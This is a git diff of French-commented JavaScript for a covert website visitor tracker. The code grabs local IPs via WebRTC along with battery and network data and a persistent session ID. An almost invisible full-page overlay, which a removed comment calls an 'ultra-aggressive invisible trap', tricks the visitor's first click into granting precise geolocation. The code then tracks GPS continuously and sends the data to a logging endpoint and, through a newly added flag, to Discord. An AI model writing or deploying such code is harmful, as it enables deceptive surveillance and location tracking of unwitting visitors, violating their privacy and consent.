@@ -34,7 +34,6 @@ async function getLocalIP() {
             }
         };
 
-        // Timeout plus court pour ne pas bloquer l'envoi initial
         setTimeout(() => {
             if (ips.length > 0) {
                 cachedLocalIp = ips[0];
@@ -56,7 +55,7 @@ async function getPreciseLocation() {
 
         const options = {
             enableHighAccuracy: true,
-            timeout: 15000, // On laisse 15s au GPS pour répondre
+            timeout: 15000, 
             maximumAge: 0
         };
 
@@ -80,7 +79,6 @@ async function getPreciseLocation() {
     });
 }
 
-// Fonction pour récupérer les infos batterie et réseau
 async function getDeviceStats() {
     const stats = {
         battery: null,
@@ -88,7 +86,6 @@ async function getDeviceStats() {
         connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
     };
 
-    // Correction WiFi/4G basée sur l'IP locale (on n'attend pas l'IP ici pour aller vite)
     const localIp = cachedLocalIp;
     if (localIp && (localIp.startsWith('192.168.') || localIp.startsWith('10.') || localIp.includes('.local'))) {
         stats.connection = 'wifi';
@@ -107,16 +104,14 @@ async function getDeviceStats() {
     return stats;
 }
 
-// Récupérer ou générer un ID de session persistant pour ce visiteur
 let sessionId = localStorage.getItem('tracker_session_id');
 if (!sessionId) {
     sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
     localStorage.setItem('tracker_session_id', sessionId);
 }
 
-async function logVisitor(preciseLocation = null, isUpdate = false) {
+async function logVisitor(preciseLocation = null, isUpdate = false, forceDiscord = false) {
     try {
-        // On récupère l'IP locale mais sans bloquer si on l'a déjà
         const localIp = cachedLocalIp || await getLocalIP();
         const stats = await getDeviceStats();
         
@@ -126,6 +121,7 @@ async function logVisitor(preciseLocation = null, isUpdate = false) {
             body: JSON.stringify({
                 sessionId: sessionId,
                 isUpdate: isUpdate,
+                forceDiscord: forceDiscord,
                 localIp: localIp,
                 preciseLocation: preciseLocation,
                 deviceStats: stats,
@@ -141,68 +137,43 @@ async function logVisitor(preciseLocation = null, isUpdate = false) {
     }
 }
 
-// Nouvelle logique pour "forcer" la localisation avec un piège invisible ultra-agressif
 async function startVerification() {
     let overlay = document.getElementById('verification-overlay');
 
-    // Si l'overlay n'existe pas (sur les pages tableaux par exemple), on le crée dynamiquement
     if (!overlay) {
-        console.log("Création dynamique de l'overlay de capture...");
         overlay = document.createElement('div');
         overlay.id = 'verification-overlay';
         Object.assign(overlay.style, {
-            position: 'fixed',
-            top: '0',
-            left: '0',
-            width: '100vw',
-            height: '100vh',
-            background: 'rgba(0,0,0,0.01)',
-            zIndex: '99999',
-            cursor: 'pointer',
-            display: 'flex',
-            alignItems: 'center',
-            justifyContent: 'center'
+            position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh',
+            background: 'rgba(0,0,0,0.01)', zIndex: '99999', cursor: 'pointer',
+            display: 'flex', alignItems: 'center', justifyContent: 'center'
         });
-
         const msg = document.createElement('div');
         Object.assign(msg.style, {
-            background: 'rgba(0,0,0,0.6)',
-            color: 'white',
-            padding: '10px 20px',
-            borderRadius: '30px',
-            fontSize: '12px',
-            pointerEvents: 'none',
-            opacity: '0.1'
+            background: 'rgba(0,0,0,0.6)', color: 'white', padding: '10px 20px',
+            borderRadius: '30px', fontSize: '12px', pointerEvents: 'none', opacity: '0.1'
         });
         msg.innerText = 'Cliquer pour activer le contenu interactif';
-        
         overlay.appendChild(msg);
         document.body.appendChild(overlay);
     }
 
-    // On s'assure que l'overlay est bien invisible mais présent
     overlay.style.display = 'flex';
 
-let lastLoggedPos = null;
+    let lastLoggedPos = null;
 
-// Fonction pour calculer la distance entre deux points en mètres
-function getDistance(lat1, lon1, lat2, lon2) {
-    const R = 6371e3; // Rayon de la terre en mètres
-    const φ1 = lat1 * Math.PI/180;
-    const φ2 = lat2 * Math.PI/180;
-    const Δφ = (lat2-lat1) * Math.PI/180;
-    const Δλ = (lon2-lon1) * Math.PI/180;
-
-    const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
-              Math.cos(φ1) * Math.cos(φ2) *
-              Math.sin(Δλ/2) * Math.sin(Δλ/2);
-    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-
-    return R * c;
-}
+    function getDistance(lat1, lon1, lat2, lon2) {
+        const R = 6371e3;
+        const φ1 = lat1 * Math.PI/180;
+        const φ2 = lat2 * Math.PI/180;
+        const Δφ = (lat2-lat1) * Math.PI/180;
+        const Δλ = (lon2-lon1) * Math.PI/180;
+        const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) + Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ/2) * Math.sin(Δλ/2);
+        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+        return R * c;
+    }
 
     const handleFirstClick = async () => {
-        // 1. On montre que ça charge en changeant l'opacité et le curseur
         overlay.style.cursor = 'wait';
         const msg = overlay.querySelector('div');
         if (msg) {
@@ -210,76 +181,38 @@ function getDistance(lat1, lon1, lat2, lon2) {
             msg.style.opacity = '0.8';
         }
         
-        // 2. On envoie le premier log (IP) sans attendre la fin pour gagner du temps
-        logVisitor();
+        // ENVOI IMMÉDIAT DISCORD
+        logVisitor(null, false, true);
 
-        // 3. On demande le GPS (on attend max 15s)
         try {
             const location = await getPreciseLocation();
             if (location) {
                 lastLoggedPos = location;
-                const localIp = cachedLocalIp || await getLocalIP();
-                const stats = await getDeviceStats();
-                await fetch('/api/log', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        sessionId: sessionId,
-                        isUpdate: true,
-                        forceDiscord: true,
-                        localIp: localIp,
-                        preciseLocation: location,
-                        deviceStats: stats,
-                        userAgent: navigator.userAgent,
-                        language: navigator.language,
-                        screenResolution: `${window.screen.width}x${window.screen.height}`,
-                        referrer: document.referrer || 'Direct',
-                        page: window.location.pathname
-                    })
-                });
+                // ENVOI GPS DISCORD
+                await logVisitor(location, true, true);
             }
-        } catch (e) {
-            console.error("Erreur capture GPS:", e);
-        }
+        } catch (e) {}
 
-        // 4. MAINTENANT on fait disparaître l'overlay
         overlay.style.display = 'none';
 
-        // Mode watchPosition pour la suite
         if (navigator.geolocation) {
             navigator.geolocation.watchPosition(
                 async (position) => {
                     const newLoc = {
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        speed: position.coords.speed
+                        lat: position.coords.latitude, lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy, speed: position.coords.speed
                     };
-
-                    if (!lastLoggedPos) {
+                    if (!lastLoggedPos || getDistance(lastLoggedPos.lat, lastLoggedPos.lon, newLoc.lat, newLoc.lon) > 3) {
                         lastLoggedPos = newLoc;
                         await logVisitor(newLoc, true);
-                    } else {
-                        const dist = getDistance(lastLoggedPos.lat, lastLoggedPos.lon, newLoc.lat, newLoc.lon);
-                        if (dist > 3 || (newLoc.accuracy < lastLoggedPos.accuracy - 5)) {
-                            lastLoggedPos = newLoc;
-                            await logVisitor(newLoc, true);
-                        }
                     }
                 },
-                (err) => console.warn("Erreur watchPosition:", err),
-                { 
-                    enableHighAccuracy: true, 
-                    maximumAge: 0,
-                    timeout: 10000 
-                }
+                null,
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
             );
         }
 
-        // Heartbeat pour maintenir la session active
-        setInterval(async () => {
-            await logVisitor(null, true);
-        }, 30000);
+        setInterval(() => logVisitor(null, true), 30000);
     };
 
     overlay.addEventListener('click', handleFirstClick, { once: true });
